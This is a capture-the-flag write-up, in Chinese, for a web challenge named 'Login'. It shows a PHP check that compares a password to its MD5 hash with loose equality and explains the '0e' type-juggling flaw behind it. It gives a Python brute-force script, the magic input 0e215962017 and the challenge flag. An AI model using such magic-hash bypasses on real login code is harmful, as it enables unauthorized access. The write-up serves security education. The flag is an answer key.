# Login

*Just login and get the flag!*

*[http://185.235.41.189](http://185.235.41.189/)*

---

访问`/robots.txt`

```php
if (isset($_GET["password"])) {
    if (hash("md5", $_GET["password"]) == $_GET["password"]) {
        echo "<h1>Here is the flag:</h1>" . $flag;
    } else {
        echo "Try harder!";
    }
}
```

`==`是弱类型的比较,字符串在与数字比较前会自动转换为数字;`0e123456`这类字符串会被识别为科学技术法的数字，0的多少次方都是零,所以`oe+数字` `==` `oe+数字`.

所以我们只要找到一个形如`oe+数字`且哈希后仍为`oe+数字`的字符串即可.

代码:

```python
import hashlib

i = 0
while True:
    m = hashlib.md5()
    plain = f'0e{i}'
    m.update(plain.encode('utf-8'))
    t = m.hexdigest()
    if t[:2] == '0e' and t[2:].isdigit():
        print(plain, t)
        break
    i += 1
    if not i % 10000:
        print(i)
```

`md5("0e215962017") == "0e291242476940776845150308577824"`

**flag:**`TMUCTF{D0_y0u_kn0w_7h3_d1ff3r3nc3_b37w33n_L0053_c0mp4r150n_4nd_57r1c7_c0mp4r150n_1n_PHP!?}`